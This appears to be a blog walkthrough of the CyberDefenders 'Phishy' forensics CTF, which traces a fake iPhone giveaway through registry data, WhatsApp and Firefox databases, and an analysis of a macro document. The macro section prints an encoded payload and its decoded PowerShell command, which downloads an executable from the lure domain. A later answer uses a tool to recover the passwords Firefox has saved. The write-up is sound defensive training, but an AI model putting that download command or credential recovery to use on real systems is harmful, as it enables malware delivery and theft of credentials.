---
title: CyberDefenders Writeup  Phishy
date: 2022-09-05 16:46:09
tags:
cover: https://cyberdefenders.org/media/terraform/Phishy/phishy.png
categories:
- [CyberDefenders]
---

This CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.
The maldoc download a malware in our victim personal computer! Let's figure out what is going on!

# Challenge Information 


+++info Description

A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee's system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.
+++

Challenge Link & Author 

{% links %}
- site: Challenge Link 
  url: https://cyberdefenders.org/blueteam-ctf-challenges/60
  desc: CyberDefenders - Phishy 
  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png
  color: "#2296fd"
- site: Author - SemahBA
  desc: SemahBA Twitter Profile
  url: https://twitter.com/BenaliSemah
  image: https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg
  color: "#de2336"

{% endlinks %}
# Walkthrough 
I use WSL, FTK imager and Registry Explorer

> 1- What is the hostname of the victim machine?

![](https://i.imgur.com/UlU40CE.png)
Let's check `SYSTEM\ControlSet001\Control\ComputerName\ComputerName` registry key 
![](https://i.imgur.com/bUMRhhs.png)

Answer:  WIN-NF3JQEU4G0T

> 2- What is the messaging app installed on the victim machine?

![WhatsApp](https://i.imgur.com/vE2xpqz.png )
Answser: WhatsApp

> 3- The attacker tricked the victim into downloading a malicious document. Provide the full download URL.

WhatsApp has a database that stores the messages and discussion. Let's check `\Users\Semah\AppData\Roaming\WhatsApp`.We find a folder called `Databases` that contains a `db` that can be opened using `DB Browser for SQLite`. The messages are stored in `msgstore.db`
![](https://imgur.com/SFlAYTD.png)
We can open this db file using `DB Browser` and check the `legacy_available_messages_view` table and we will a discussion about IPhone 12 special edition giveaway 
![](https://imgur.com/EGZVAxH.png)
Answer:  http://appIe.com/IPhone-Winners.doc

> 4- Multiple streams contain macros in the document. Provide the number of the highest stream.

The victim download the word document file. You can find it on `Semah\Downloads` folder
Let's export it from FTK imager and use `oledump` to check the streams in the document
We find `Macros/VBA/iphoneevil` the highest stream 
```bash command line prompt
Raf²@4n6nk8s:~$ oledump IPhone-Winners.doc                                                                                       
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      8473 '1Table'
  5:       501 'Macros/PROJECT'
  6:        68 'Macros/PROJECTwm'
  7:      3109 'Macros/VBA/_VBA_PROJECT'
  8:       800 'Macros/VBA/dir'
  9: M    1170 'Macros/VBA/eviliphone'
 10: M    5581 'Macros/VBA/iphoneevil'
```
Answer: 10 

Let's do some analysis on the macro and the malicious document using the `oletools` 

```bash command line prompt
Raf²@4n6nk8s:~$ olevba IPhone-Winners.doc --deobf
olevba IPhone-Winners.doc --deobf                                                                                 ─╯
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.10.4 - http://decalage.info/python/oletools
===============================================================================
FILE: IPhone-Winners.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO eviliphone.cls
in file: IPhone-Winners.doc - OLE stream: 'Macros/VBA/eviliphone'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
```
Scrolling a bit and we find a VBA string variable from the macro that contain base64 cipher, the macro try to execute the decoded 
ٍ![](https://imgur.com/bvrf9oR.png)
OK let's decode it and check what the attacker want to do ! 
```bash command line prompt
raf²@4n6nk8s:~$ echo -n "aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA" | base64 -d

invoke-webrequest -Uri 'http://appIe.com/Iphone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentials
```
Wow! The macro try to run an obfuscated `powershell` command that download an executable from `http://appIe.com/Iphone.exe` and save it as  `C:\Temp\IPhone.exe`


> 5- The macro executed a program. Provide the program name?

Answer: Powershell

> 6- The macro downloaded a malicious file. Provide the full download URL.

Answer: http://appIe.com/Iphone.exe

> 7- Where was the malicious file downloaded to? (Provide the full path)

Answer:  C:\Temp\IPhone.exe

> 8- What is the name of the framework used to create the malware?

I am sure that Metasploit is the framework. But let's make it like we get the points without guessing the answer! OK dude upload the malicious file downloaded to our love `virustotal` 
![](https://imgur.com/BKPJ37M.png)

Just google `Meterpreter` and you'll find that Meterpreter is a Metasploit attack payload that provides an interactive shell

Ok dude don't search ! go to `COMMUNITY` tab in `virustotal` and you'll find comments. You'll find a metasploit payload detected ! 

![](https://imgur.com/xuOEWiC.png)

Answer: Metasploit

> 9- What is the attacker's IP address?

OK! Now we know that the malicious document download a binary! Of course this binary is a malware.
We need to know what is the attacker's IP address. So let's do some dynamic analysis. We can do it using either `any.run` or `hybrid-analysis`. I will use it both of them just for fun !! Just upload the binary `IPhone.exe` and check the connections !

ٍ![](https://imgur.com/w04BlMl.png "Using app.run.any")
ٍ![](https://imgur.com/wNJKnce.png "Using HYBRID ANALYSIS")

Answer: 155.94.69.27

> 10- The fake giveaway used a login page to collect user information. Provide the full URL of the login page?

We find firefox installed in the victim device, Mozilla Firefox browsers stores his history and cookies in `AppData\Roaming\Mozilla\Firefox\`. We can inspect it using SQLite Browser.
The most important db file is `places.sqlite`. Inspect it and open the `moz_places` database table and check the history of the victim !
![](https://imgur.com/qbtAcRf.png)

Answer:  http://appIe.competitions.com/login.php

> 11- What is the password the user submitted to the login page?

There is a tool called `Password Fox` that will resolve our problem here !
PasswordFox is a small password recovery tool that allows you to view the user names and passwords stored by Mozilla Firefox Web browser.
Download it from [here](https://www.nirsoft.net/utils/passwordfox.html)

![](https://imgur.com/pM1lfwD.png "Here is the password")

Answer: GacsriicUZMY4xiAF4yl

